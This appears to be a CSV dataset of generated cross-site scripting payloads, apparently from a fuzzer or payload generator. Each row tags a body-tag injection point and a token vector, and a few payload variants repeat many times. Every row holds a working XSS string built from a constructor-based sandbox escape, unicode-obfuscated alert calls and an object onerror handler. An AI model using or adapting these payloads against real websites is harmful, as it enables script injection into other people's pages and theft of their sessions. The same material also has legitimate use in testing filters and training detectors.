eval_place,sig_vector,sig_string
0,1,2
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 223, 26, 48, 83]",{}[$='constructor']orderBy:<object onerror=javascript:alert();//>
body_tag,"[92, 223, 26, 48, 83]",{}[$='constructor']orderBy:<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 223, 26, 48, 83]",{}[$='constructor']orderBy:<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 223, 26, 48, 83]",{}[$='constructor']orderBy:<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 223, 26, 48, 83]",{}[$='constructor']orderBy:<object onerror=javascript:alert();//>
body_tag,"[282, 64, 26, 48, 83]",(z=alert)(1)al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[282, 64, 26, 48, 83]",(z=alert)(1)al\u0065rt``;<object onerror=javascript:alert();//>
body_tag,"[92, 64, 26, 48, 83]",{}[$='constructor']al\u0065rt``;<object onerror=javascript:alert();//>
